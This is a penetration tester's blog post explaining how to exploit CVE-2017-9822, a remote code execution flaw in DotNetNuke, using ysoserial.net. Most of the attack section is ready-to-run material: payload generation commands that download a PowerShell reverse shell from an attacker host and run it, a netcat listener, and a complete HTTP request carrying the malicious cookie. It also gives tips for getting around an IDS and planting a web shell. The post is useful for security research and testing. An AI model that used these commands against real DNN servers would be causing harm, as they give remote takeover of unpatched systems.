---
layout: post
title:  "Remote Code Execution on DotNetNuke"
tagline: "A look at CVE-2017-9822, RCE on DNN"
description: "A look at exploiting CVE-2017-9822 via ysoserial.net payloads."
tags: [exploits, notes, windows]
date:   2019-05-24
comments: true
image:
  feature: blog/8/feature.jpg
  hero: blog/8/header.jpg
  credit: https://www.pexels.com/photo/woman-behind-laptop-computer-1268472/
  creditlink: rawpixel.com
---
**On 13 March 2018** The Black Hat 2017 talk [Friday the 13th: JSON Attacks](https://youtu.be/oUAeWhW5b8c?t=2363) was uploaded, in which [@pwntester](https://pwntester.com/) showed off Proof of Concept code for [CVE-2017-9822](https://nvd.nist.gov/vuln/detail/CVE-2017-9822), a Remote Code Execution vulnerability that affects DotNetNuke (DNN) versions 5.0.0 up to 9.1.0. However at the time the only form the code was shared in was in the video and [PDF of the slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf).

**In October 2018** I started doing some research into DotNetNuke vulnerabilities for an engagement and came across this talk. At the time I couldn't find the demonstrated PoC code anywhere besides the talk itself, so I decided to pause the video, transcribe the XML payload character-for-character, and [share it on twitter](https://twitter.com/GlitchWitchIO/status/1057016441029967873).

But I didn't stop there! I still needed to get RCE working outside of the [FileSystemUtils](https://dotnetnukeru.com/dnndocs/api/html/T_DotNetNuke_Common_Utilities_FileSystemUtils.htm) class, and only had [this exploit](https://pastebin.com/Y6SjeG27) that had been seen in the wild in a [campaign dubbed "Zealot"](https://www.f5.com/labs/articles/threat-intelligence/zealot-new-apache-struts-campaign-uses-eternalblue-and-eternalsynergy-to-mine-monero-on-internal-networks).

## The exploit

After some trial and error, and a nudge from pwntester, I was able to create a reliable exploit by generating a payload with `ysoserial.net` using the `ObjectStateFormatter` as part of the `TypeConfuseDelegate` gadget and dropping the base64 output into the [wrapper used by the Zealot campaign](https://pastebin.com/iGTLweEg).

```powershell
.\ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe curl http://justtesting.local/rcetest" -o base64
```

At this point I had a way to generate a functional exploit and continued on my engagement. However shortly afterwards pwntester created a plugin for ysoserial.net and [had me give it a test](https://twitter.com/pwntester/status/1067136455615614976).

## ysoserial.net DNN plugin

Now that the plugin is [functional](https://github.com/pwntester/ysoserial.net/commit/8001f0ebd0b169a5c6bb8424363b761c38c72bdf), we can generate payloads directly from [ysoserial.net](https://github.com/pwntester/ysoserial.net) without the need to combine two different pieces as I did before.

```powershell
.\ysoserial.exe -p DotNetNuke -M run_command -C  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe curl http://spookyhacker.glitchwitch.io/reverseshell.ps1 -O C:\Users\Public\totallylegit.ps1; C:\Users\Public\totallylegit.ps1"
```

We can replace the command after the `-C` flag with whatever suites your needs. If you are unable to spawn a reverse shell due to an IDS or can't get a web shell due to not knowing the DNN install directory, you can work around this by running `ls C: > C:\Users\Public\dir.log` and then later read that file using a [different payload](https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4) to discover the install directory so a web shell can be uploaded.

In the example above we use curl to download and later execute a powershell file.

## Demo

In this example we will generate a payload that downloads and executes samratashok's [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to start a reverse shell.

First we start listening on our attack machine with netcat on port 1337.

```shell_session
nc -lvnp 1337
```

Then we generate the payload using ysoserial.net, taking care to replace the IP address used with your attack machine.

```powershell
.\ysoserial.exe -p DotNetNuke -M run_command -C  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.13.37 -Port 1337"
```
Then we visit a 404 page on our test site to generate the needed cookie.

Next we drop the entire ysoserial.net payload into the `DNNPersonalization=` portion of the cookie, taking care to add a semi-colon at the end.

The resulting request will ultimately look like this.

```http
Host: www.vulnerable.host
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 Chrome/69.0.3497.81 Safari/537.36
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: dnn_IsMobile=False;DNNPersonalization=<profile><item key="foo" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) " xmlns:xsi=" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) "><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type="xsd:string">/wEyxBEAAQAAAP////SSBmb3Jnb3QgdG8gc2F2ZSB0aGUgcGF5bG9hZCB3aGVuIEkgd3JvdGUgdGhpcyBibG9nIHBvc3QgYW5kIHdhcyB0b28gYnVzeSB0byBzcGluIHVwIGEgbmV3IHdpbmRvd3MvZG5uIHZt=</anyType></MethodParameters><ObjectInstance xsi:type="ObjectStateFormatter"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>;language=en-US; .ASPXANONYMOUS=AdJ_92Sn1AEkAAAAODU5YjVjZWMtOWMwYS00ZmE1LThkODgtNWI2OTA0NjZjZjcz0; DotNetNukeAnonymous=b8bcc886-3286-4c26-8a9a-b6d3a73c6376; __RequestVerificationToken=JXPAgO5sl6NtPas-NgSv6SDSQgqLV8eAIlRa0ihpoSVyw_MSzjHXsgJhmQSV-mfU7IZOqjDfBz-fhJ81upD024MEoJ2UKG_QjTSYW_tVkAzOad9tOaWjzfm2c1o1
Connection: close
```
